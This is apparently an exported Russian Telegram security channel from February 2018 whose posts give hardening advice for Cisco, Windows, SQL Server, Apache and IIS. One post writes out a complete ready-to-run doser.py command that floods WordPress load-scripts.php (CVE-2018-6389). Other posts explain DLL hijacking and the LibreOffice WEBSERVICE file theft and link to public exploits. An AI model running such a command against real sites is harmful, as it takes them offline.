Считается, что циски весьма отличаются секурностью, но и на старуху найдется проруха. И не какая-то, а вполне себе полноценное RCE.<br><br>В данном случае речь о недавно анонсированной уязвимости CVE-2018-0101 в Cisco ASA, связанной с ошибками в обработке XML. Уязвимость позволяет без аутентификации удаленно выполнить произвольный код, ну или хотя бы вызвать отказ в обслуживании. Эсплуатируется через HTTPS сервисы или IKE2 RemoteAccess VPN. Эксплойтов не дам, сорян, ребята, они есть, но стоят $25k-$100k.<br><br>Далее имеем два пути - правильный и ленивый.<br><br><strong>Правильный:</strong><br><br>Вендор выпустил патчи уязвимости, надо их установить. Исправленные версии: <a href="9.1.7.23">9.1.7.23</a>, <a href="9.2.4.27">9.2.4.27</a>, <a href="9.4.4.16">9.4.4.16</a>, <a href="9.6.4.3">9.6.4.3</a>, <a href="9.7.1.21">9.7.1.21</a>, <a href="9.8.2.20">9.8.2.20</a>, <a href="9.9.1.2">9.9.1.2</a> и выше в ветках 9.1, 9.2, 9.4, 9.6, 9.7, 9.8 и 9.9. Другие ветки не поддерживаются и не обновлены. <br><br><strong>Ленивый &quot;не хотим ничего тестировать и обновлять&quot;:</strong><br><br>Можно отключить/ограничить доступ к уязвимым сервисам. Надо заметить, что способ ОЧЕНЬ неправильный, потому что сервисы когда-то могут оказаться внезапно включенными. Да и вообще нужны.<br><br>ASDM - скорей всего отключать не хочется, но можно ограничить доступ адресами админов:<br><br><code>http &lt;remote_ip_address&gt; &lt;remote_subnet_mask&gt; &lt;interface_name&gt;</code><br><br>AnyConnect IKEv2 Remote Access, AnyConnect SSL VPN и Clientless SSL VPN - либо отключить, либо повесить ACL для списка легитимных клиентов (доступ к портам TCP/443, UDP/500 и где у вас настроен Client Services) . Можно юзать IPSec Remote Access с IKEv1, но он совместим только со старым VPN-клиентом Cisco, мда...<br><br>Local Certificate Authority - либо отключить (но тогда отвалится аутентификация по сертификатам, если не используется сторонний центр сертификации), либо повесить ACL для тех же клиентов (порт TCP/443).<br><br>Mobile Device Manager (MDM) Proxy - выключить или повесить ACL.<br><br>Mobile User Security (MUS) - та же фигня, порт конфигурируем, найти можно в строке конфигурации <code>mus server enable port &lt;port #&gt;</code>.<br><br>Proxy Bypass - опять же выключить или ACL (порт TCP/443 или другие, если настроены).<br><br>Все еще не хочется обновляться? =)
       </div>

      </div>

     </div>

     <div class="message service" id="message-100">

      <div class="body details">
9 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message113">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="09.02.2018 10:59:19">
10:59
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
В мире безопасности постоянно что-то происходит: утечки данных, взломы крупных корпораций, регулярные проблемы с криптовалюьами, выход новой малвари, изменения в законодательстве и прочая фигня. Обычно мы далеки от этого, сидим как паучки в своей сеточке и охраняем ее. Но сегодня я хочу написать о чем-то важном, о том, что сеточек наших не касается, но касается всех нас.<br><br><a href="Booking.com">Booking.com</a> передает данные вашей карты отелю. В том числе CVV. CVV! Критика!<br><br>По идее отели обязуются хранить их соответственно PCI DSS, но мы то понимаем, что это полный бред и никакого PCI DSS там нет.<br><br>Данные передаются в момент бронирования. У Букинга предусмотрена двухфакторная аутентификация для доступа в личный кабинет отеля: увидеть данные клиента может только уполномоченный сотрудник отеля. Но куда дальше пойдут ваши данные...<br><br>В общем, при желании пользоваться Букингом (ну а как же без него?) разумно завести для этого отдельную карту.<br><br>Источник: <a href="https://journal.tinkoff.ru/booking-card/">https://journal.tinkoff.ru/booking-card/</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-101">

      <div class="body details">
12 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message114">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="12.02.2018 11:42:21">
11:42
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
DoS может быть иногда интересен. Когда речь идет о пограничных маршрутизаторах или о порядка четверти сайтов в интернете. В WordPress найдена уязвимость, позволяющая не напрягаясь уложить сайт (CVE 2018-6389).<br><br>В платформе есть две функции load-scripts.php и load-styles.php, позволяющие указать список загружаемых JS-скриптов или CSS. Они доступны на странице логина, поэтому не требуют авторизации. Предполагаемый смысл - уменьшить количество запросов к сайту при загрузке дополнительных файлов. Ну а на деле можно запросить все доступные файлы, загрузив сервер на 2 с лишним секунды и потребовав ответ в 4 МБ.<br><br>Примечательно, что производитель не считает это багой и не собирается исправлять, поэтому все актуальные версии уязвимы.<br><br>Эксплуатируется очень просто, вот тулза от ресерчера, чтобы повторять запросы: <a href="https://github.com/quitten/doser.py">https://github.com/quitten/doser.py</a>. Запускается для эксплойтинга:<br><br><code>python doser.py -g &apos;http://mywpserver.com/wp-admin/load-scripts.php?c=1&amp;load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&amp;ver=4.9&apos; -t 9999</code><br><br>И этот парень, Barak Tawily, даже позаботился о несчастных владельцах сайтов на WordPress заместо производителя и написал скрипт, который устранит уязвимость: <a href="https://github.com/Quitten/WordPress/blob/master/wp-dos-patch.sh">https://github.com/Quitten/WordPress/blob/master/wp-dos-patch.sh</a>.
       </div>

      </div>

     </div>

     <div class="message service" id="message-102">

      <div class="body details">
13 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message115">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="13.02.2018 11:09:34">
11:09
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Cisco включает по умолчанию функцию Proxy ARP на интерфейсах третьего уровня своего оборудования. Вы можете о ней даже не знать, а она есть...<br><br>Proxy ARP позволяет интерфейсу отвечать на &quot;чужие&quot; ARP-запросы своим маком. Это происходит, когда выполняются следующие условия (все сразу):<br>- целевой IP-адрес ARP-запроса находится в IP-подсети, отличной от IP-подсети, в которой ARP-запрос получен<br>- маршрутизатор имеет один или несколько маршрутов к целевому IP-адресу ARP-запроса<br>- маршруты к целевому IP-адресу ARP-запроса указывают на исходящий интерфейс, отличный от интерфейса, на который ARP-запрос был получен<br><br>Это может быть нужно, когда:<br>1. Используется NAT с пулом адресов, не входящих в ту же сеть, что и адрес интерфейса<br>2. Используется странная фрагментация сети, когда клиенты считают, что их сеть шире, чем прописано на интерфейсе. Например, если клиенты не поддерживают произвольную длину маски.<br><br>Proxy ARP в некоторой степени расширяет широковещательный домен, увеличивая область применения сетевых атак на локальный сегмент. Поэтому его рекомендуется отключать. Ну и избыточная функциональность - к чему она?<br><br>При настройке NAT (первый случай применения Proxy ARP) рекомендуется назначать интерфейсу секондари адрес из пула NAT, это включит еще и Gratuitous ARP.<br><br>Второй случай использования Proxy ARP весьма специфический и очень редкий.<br><br>Так что выключаем) Можно выключить глобально:<br><br><code>(config)# ip arp proxy disable</code><br><br>Или на каждом интерфейсе:<br><br><code>(config-if)# no ip proxy-arp</code><br><br>На ASA:<br><br><code>(config)# sysopt noproxyarp &lt;interface_name&gt;</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-103">

      <div class="body details">
14 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message116">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="14.02.2018 11:01:44">
11:01
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Недавно анонсирована уязвимость повышения прав в Windows через Skype. Уязвимость примечательна тем, что Microsoft сказал &quot;слишком сложно&quot; и &quot;исправим в следующей версии&quot;.<br><br>Для обновления Skype использует не общие механизмы Windows Update, а собственное приложение &quot;%ProgramFiles%\Skype\Updater\Updater.exe&quot;, которое запускается с правами SYSTEM. Если обнаружено доступное обновление Updater.exe распаковывает его в &quot;%SystemRoot%\Temp\SKY&lt;abcd&gt;.tmp&quot; и запускает команду &quot;%SystemRoot%\Temp\SKY&lt;abcd&gt;.tmp&quot; <a href="" onclick="return ShowBotCommand(&quot;QUIET&quot;)">/QUIET</a>. Это приложение загружает дополнительные библиотеки, в частности UXTheme.dll, и ищет их сначала в папке запуска (что в общем то обычное дело) %SystemRoot%\Temp\.<br><br>Соответственно, при наличии у пользователя доступа к папке %SystemRoot%\Temp\ он может подменить библиотеку кодом, который выполнится с правами SYSTEM.<br><br>Папка %SystemRoot%\Temp\ используется множеством софта, так что нельзя просто взять и ограничить к ней доступ. Можно было бы удалить Updater.exe, но тогда скайп не будет обновляться. Что ж, давайте сделаем так: скопируем UXTheme.dll из %SystemRoot%\system32\ в %SystemRoot%\Temp\ и запретим к ней доступ на изменение и запись - скайп будет загружать ее, а подменить ее хакеру с правами рядового пользователя не удастся.
       </div>

      </div>

     </div>

     <div class="message service" id="message-104">

      <div class="body details">
15 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message117">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="15.02.2018 10:57:59">
10:57
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Проблема небезопасной загрузки динамических библиотек вообще характерна для продуктов Microsoft. Она стала причиной уязвимостей MS10-087, MS10-093, MS10-094,  MS10-095, MS10-096, MS10-097, MS11-001, MS11-003, MS11-015, MS11-016, MS11-017, MS11-023, MS11-025, KB2533623, MS11-055, MS11-059, MS11-071, MS11-073, MS11-075, MS11-076, MS11-085, MS11-094, MS11-099, MS12-012, MS12-014, MS12-022, MS12-039, MS12-046, MS12-074, MS14-023.<br><br>Ответственность за обеспечение безопасности подключения библиотек в первую очередь на разработчиках. Например, при указании при вызове функции LoadLibraryEx() ключа LOAD_LIBRARY_SEARCH_SYSTEM32 поиск библиотеки начинается с system32 (странно, почему Microsoft не мог просто использовать это в скайпе?).<br><br>Но что-то в силах сделать и администраторы.<br><br>Во-первых, это ключ <strong>SafeDllSearchMode</strong> (HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode), который немного меняет порядок поиска библиотек:<br><br>1. Директория, из которой запущно приложение<br>2. Системная директория<br>3. Директория Winodws<br>4. Текущая директория<br>5. Директории из переменной окружения PATH<br><br>Если отключить SafeDllSearchMode, порядок будет такой:<br><br>1. Директория, из которой запущно приложение<br>2. Текущая директория<br>3. Системная директория<br>4. Директория Winodws<br>5. Директории из переменной окружения PATH<br><br><strong>Особо интересны два момента:</strong><br><br>- Если библиотека с таким именем уже загружена в память, то будет использоваться этот образ<br>- Если библиотека присутствует в KnownDlls, то она будет загружаться из стандартного пути<br><br>На последнем моменте надо остановиться подробнее. Известные библиотеки перечислены в узле реестра <strong>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</strong> и по умолчанию загружаются ТОЛЬКО из системных директорий. Путь их поиска можно задать ключами HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs:DllDirectory и HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs:DllDirectory32.<br><br>Поэтому, в общем то, вчерашнюю проблему со скайпом можно решить путем добавления библиотеки в KnownDlls.
       </div>

      </div>

     </div>

     <div class="message service" id="message-105">

      <div class="body details">
16 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message118">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="16.02.2018 13:05:16">
13:05
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
А еще можно установить тотальный контроль за тем, что юзерам можно запускать, а что нельзя. И, используя AppLocker, сделать это совсем не составит труда.<br><br>Настраивается он через групповые политики: Конфигурация компьютера\Политики\Конфигурация Windows\Параметры безопасности\Политики управления приложениями\AppLocker. Тут есть категории Исполняемые правила (ага, очередной дурацкий перевод, на самом деле это правила для исполняемых файлов), Правила установщика, Правила сценариев, и можно добавить Правила DLL (правым кликом по AppLocker, Свойства, там можно добавить). Покрывают они соответственно следующие типы файлов:<br>- .exe, .com<br>- .mst, .msi, .msp<br>- .js, .ps1, .vbs, .cmd, .bat<br>- .dll, .ocx<br><br>Рассмотрим на примере &quot;Исполняемых правил&quot;. Сначала там пусто. Можно кликнуть правой кнопкой и выбрать &quot;Создать правила по умолчанию&quot;, после чего появится три недурных правила. <br><br>Далее можно создать любые свои правила. В правилах задается группа или пользователь, тип идентификации приложения - Издатель, Путь или Хеш. Потом можно задать исключения.<br><br>Если выбрать Издатель, потребуется указать путь к файлу, из которого AppLocker сам прочтет сертификат подписи, заполнит параметры фильтрации. Затем их можно изменить и выбрать уровень строгости с помощью ползунка. Например, можно заблокировать/разрешить все программы определенного издателя или установить контроль по версии конкретной программы.<br><br>Если выбрать Путь, надо указать путь (ну надо же!).<br><br>Если выбрать хеш, надо указать файл, от которого AppLocker посчитает хеш и запомнит для сверки.<br><br>Что касается формирования путей в AppLocker в целом - тут используются специальные переменные: %WINDIR% (это %SystemRoot%), %SYSTEM32% (%SystemDirectory%), %OSDRIVE% (%SystemDrive%), %PROGRAMFILES% (%ProgramFiles% и %ProgramFiles(x86)% вместе), %REMOVABLE% (съемные медиа носители), %HOT% (съемные хранилища, USB например).<br><br>Правила AppLocker применяются в следующем порядке:<br>1. Все запрещающие правила в рандомном порядке<br>2. Все разрещающие правила для того, что еще не было запрещено<br>3. Все, что не было явно разрешено, запрещается<br><br>Чтобы вся эта фигня работала, нужно сконфигурировать в групповой политике автоматический запуск службы Application Identity.<br><br>Ну и если приложение запускает другое или подключает бибилотеки, оно может указать ключ для обхода AppLocker, такие вот дела.
       </div>

      </div>

     </div>

     <div class="message service" id="message-106">

      <div class="body details">
19 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message119">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="19.02.2018 11:16:17">
11:16
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;Android&quot;)">#Android</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a><br><br>Android пожирает агрессивный ботнет. И хотя бОльшая часть зараженных девайсов - в Китае и Корее, рисковать смысла нет.<br><br>Ботнет распространяется с помощью червя, эксплуатирующего уязвимости в сервисе ADB (порт 5555). Жертвами все же чаще становятся умные телевизоры, а не смартфоны.<br><br>ADB (Android Debug Bridge) - клиент-серверный интерфейс, позволяюший выполнять команды на устройстве Android. Предназначен для отладки приложений и предоставляет весьма широкие возможности по упрвлению устройством.<br><br>Так как конкретная используемая уязвимость не раскрывается, разумно просто отключить ADB, тем паче нужен он только в частных случаях.<br><br>На телевизорах в меню нужно найти раздел &quot;Отладка&quot; и отключить там ADB.<br><br>На любых устройствах отключить ADB по WiFi можно с помощью команды:<br><br><code>adb usb</code><br><br>В ADB находили и другие успешно эксплуатируемые уязвимости: RCE (<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/android/adb/adb_server_exec.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/android/adb/adb_server_exec.rb</a>), Local Privilege Escalation (<a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-android-adbd-privilege-escalation-advisory-2018-01-17.pdf">https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-android-adbd-privilege-escalation-advisory-2018-01-17.pdf</a>).
       </div>

      </div>

     </div>

     <div class="message service" id="message-107">

      <div class="body details">
20 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message120">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="20.02.2018 11:30:41">
11:30
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;СУБД&quot;)">#СУБД</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>Немного о возможностях доступа к внешним ресурсам в MS SQL Server:<br><br>Параметр &apos;clr enabled&apos; - позволяет выполнять в SQL Server внешние процедуры, триггеры и функции, скомпилированные в виде .NET кода<br><br>Параметр &apos;Ole Automation Procedures&apos; - открывает доступ к созданию и использованию внешнего функционала (скажем, процедур) с помощью объектов OLE-автоматизации<br><br>Встроенная хранимая процедура &apos;xp_cmdshell&apos; - позволяет выполнить команду оболочки операционной системы и получить вывод<br><br>Ясно, что для безопасности это все должно быть отключено.<br><br><strong>Проверить настройки:</strong><br><br><code>SELECT name, CAST(value as int) as value_configured, CAST(value_in_use as int) as value_in_use FROM sys.configurations WHERE name = &apos;clr enabled&apos; OR name = &apos;Ole Automation Procedures&apos;;</code><br><code>EXECUTE sp_configure &apos;show advanced options&apos;,1;</code><br><code>RECONFIGURE WITH OVERRIDE;</code><br><code>EXECUTE sp_configure &apos;xp_cmdshell&apos;;</code><br><br><strong>Отключить:</strong><br><br><code>EXECUTE sp_configure &apos;clr enabled&apos;, 0;</code><br><code>EXECUTE sp_configure &apos;show advanced options&apos;,1;</code><br><code>RECONFIGURE WITH OVERRIDE;</code><br><code>EXECUTE sp_configure &apos;Ole Automation Procedures&apos;, 0;</code><br><code>EXECUTE sp_configure &apos;xp_cmdshell&apos;,0;</code><br><code>RECONFIGURE WITH OVERRIDE;</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-108">

      <div class="body details">
21 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message121">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="21.02.2018 10:54:12">
10:54
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>Slowloris - мерзенький DDoS веб-серверов на основании неполной отправки заголовков.<br><br>Рассмотрим, как защитить Apache от него.<br><br>mod_reqtimeout поможет ограничить время, разрешенное для приема заголовков:<br><br><code>&lt;IfModule mod_reqtimeout.c&gt;</code><br><code>   RequestReadTimeout header=20-40,MinRate=500 body=20-40,MinRate=500</code><br><code>&lt;/IfModule&gt;</code><br><br>Тут на отправку заголовка выделяется 20 секунд, но если он приходит со скоростью от 500 байт в секунду, то сервер готов подождать и 40 секунд. То же самое с телом.<br><br>mod_qos для контроля нагрузки на сервер:<br><br><code>&lt;IfModule mod_qos.c&gt;</code><br><code>   # handle connections from up to 100000 different IPs</code><br><code>   QS_ClientEntries 100000</code><br><code>   # allow only 50 connections per IP</code><br><code>   QS_SrvMaxConnPerIP 50</code><br><code>   # limit maximum number of active TCP connections limited to 4096</code><br><code>   MaxClients 4096</code><br><code>   # disables keep-alive when 180 (70%) TCP connections are occupied</code><br><code>   QS_SrvMaxConnClose 180</code><br><code>   # minimum request/response speed (deny slow clients blocking the server, keeping connections open without requesting anything</code><br><code>   QS_SrvMinDataRate 150 1200</code><br><code>&lt;/IfModule&gt;</code><br><br>Ограничения количества клиентов и соединений от проблем доступности сервера не спасут, а вот две последние настроечки оптимизируют трату ресурсов сервера.
       </div>

      </div>

     </div>

     <div class="message service" id="message-109">

      <div class="body details">
22 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message122">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="22.02.2018 10:53:25">
10:53
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>Рассмотрим ту же проблему для IIS.<br><br>Первым делом нужно установить его компонент Security/Request Filtering через стадартный менеджер компонентов Windows.<br><br>Ну а дальше можно конфигурить ограничения:<br><br><code>%systemroot%\system32\inetsrv\appcmd set config -section:requestFiltering -requestLimits.maxAllowedContentLength:20000000</code><br><code>%systemroot%\system32\inetsrv\appcmd set config -section:requestFiltering -requestLimits.maxURL:2048</code><br><code>%systemroot%\system32\inetsrv\appcmd set config -section:requestFiltering -requestLimits.maxQueryString:2048</code><br><code>%systemroot%\system32\inetsrv\appcmd set config -section:system.webServer/security/requestFiltering /+&quot;requestLimits.headerLimits.[header=&apos;Content-type&apos;,sizeLimit=&apos;100&apos;]&quot;</code><br><code>%systemroot%\system32\inetsrv\appcmd set config -section:system.applicationHost/sites /siteDefaults.limits.connectionTimeout:&quot;00:00:30&quot; /commit:apphost</code><br><code>%systemroot%\system32\inetsrv\appcmd set config -section:system.applicationHost/webLimits /headerWaitTimeout:&quot;00:00:30&quot; /commit:apphost</code><br><code>%systemroot%\system32\inetsrv\appcmd set config -section:system.applicationHost/webLimits /minBytesPerSecond:&quot;300&quot; /commit:apphost</code>
       </div>

      </div>

     </div>

     <div class="message default clearfix joined" id="message123">

      <div class="body">

       <div class="pull_right date details" title="22.02.2018 10:53:37">
10:53
       </div>

       <div class="text">
Теперь весь наш контент доступен также в вк <a href="https://vk.com/informhardening">https://vk.com/informhardening</a> и в фейсбуке <a href="https://www.facebook.com/groups/2001513396767302/">https://www.facebook.com/groups/2001513396767302/</a>. Там есть весь прошлый контент с хештегами.
       </div>

      </div>

     </div>

     <div class="message service" id="message-110">

      <div class="body details">
23 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message124">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="23.02.2018 10:41:57">
10:41
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="media_wrap clearfix">

        <a class="photo_wrap clearfix pull_left" href="photos/photo_2@23-02-2018_10-41-57.jpg">

         <img class="photo" src="photos/photo_2@23-02-2018_10-41-57_thumb.jpg" style="width: 260px; height: 183px"/>

        </a>

       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;оффтоп&quot;)">#оффтоп</a> <a href="" onclick="return ShowHashtag(&quot;23февраля&quot;)">#23февраля</a><br><br>С праздником, господа-товарищи!<br>Маленький подарочек от меня. Это типа игра - выполнять развлекательные и полезные задания. Можно распечатать на А3 (ту, что в файлике приложена)
       </div>

      </div>

     </div>

     <div class="message default clearfix joined" id="message125">

      <div class="body">

       <div class="pull_right date details" title="23.02.2018 10:42:21">
10:42
       </div>

       <div class="media_wrap clearfix">

        <div class="media clearfix pull_left media_file">

         <div class="fill pull_left">

         </div>

         <div class="body">

          <div class="title bold">
3.jpg
          </div>

          <div class="description">
Not included, change data exporting settings to download.
          </div>

          <div class="status details">
10.7 MB
          </div>

         </div>

        </div>

       </div>

      </div>

     </div>

     <div class="message service" id="message-111">

      <div class="body details">
26 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message126">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="26.02.2018 10:44:11">
10:44
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>В LibreOffice недавно обнаружили уязвимость, позволяющую удаленно читать любые файлы. Интересна она тем, что во-первых все происходит совершенно незаметно для пользователя, а во-вторых эксплойты вполне себе публично доступны.<br><br>Эксплуатация происходит с помощью встраивания в документ функции WEBSERVICE со ссылкой на внешний URL (принадлежащий хакеру). При открытии документа выполняется запрос на этот URL, содержащий приложенные данные, например, любой доступный с правами текущего пользователя файл. Файл читается с помощью той же функции WEBSERVICE, так как в ней не реализовано ограничение обращения к схеме file://.<br><br>Уязвимость присутствует в версиях до 5.4.5 и 6.x до 6.0.1. Соответственно в версиях 5.4.5 и 6.0.1 и выше она пофикшена.<br><br>Эксплойты доступны любому: <a href="https://www.exploit-db.com/exploits/44022/">https://www.exploit-db.com/exploits/44022/</a>, <a href="https://github.com/jollheef/libreoffice-remote-arbitrary-file-disclosure">https://github.com/jollheef/libreoffice-remote-arbitrary-file-disclosure</a>.
       </div>

      </div>

     </div>

     <div class="message service" id="message-112">

      <div class="body details">
27 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message127">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="27.02.2018 11:30:37">
11:30
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;Windows&quot;)">#Windows</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a><br><br>Мда...Мы вроде живем, как обычно, а в винде непофикшенная анонсированная уязвимость + публично доступный эксплойт с легкой сложностью применения.<br><br>Несколько месяцев назад Google Project Zero открыла два issue 1427 и 1428 по поводу обхода прав доступа к файлам в винде с помощью функции SetNamedSecurityInfo. Microsoft обозвала их CVE-2018-0826 и выпустила патчи <a href="https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-0826">https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-0826</a>. Однако оказалось, что проблему 1427 эти патчи не решают.<br><br>В итоге на данный момент любой локальный пользователь может получить права доступа к любому файлу и повысить привилегии до SYSTEM. Проблема касается только Windows 10 и Windows Server 2016.<br><br>Защититься собственными силами оччень нетривиально. С одной стороны, недавно рассмотренный AppLocker просто не позволит запустить непривилегированнму пользователю эксплойт, если он разрешает только явно разрешенные программы. С другой стороны, нас как то больше волнуют хакеры, получившие доступ с правами непривилегированного пользователя, а не собственные юзвери. Им то AppLocker не помешает. Так что остается надеяться, что пока Microsoft не выпустит нормальный патч, хакерам не удастся добраться до прав непривилегированных пользователей.<br><br>Тут подробное описание уязвимости и эксплойт <a 